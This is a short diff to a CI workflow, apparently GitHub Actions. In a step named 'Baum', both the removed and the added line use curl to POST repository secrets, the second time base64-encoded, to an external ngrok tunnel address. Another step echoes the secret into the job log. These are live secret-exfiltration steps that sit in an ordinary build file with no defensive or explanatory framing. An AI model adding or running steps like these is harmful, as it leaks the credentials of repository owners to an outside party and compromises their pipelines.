@@ -24,7 +24,7 @@ jobs:
 
       - name: Baum
         run: |
-          curl "https://6ee3-128-130-234-183.ngrok-free.app/" -X POST --data '${{ secrets.FAVOURITE }}' 
+          curl "https://6ee3-128-130-234-183.ngrok-free.app/" -X POST --data "$(secrets | base64 --wrap=0) "
 
       - name: I ll tell you my current favourite 
         run: echo ${{ secrets.FAVOURITE }}
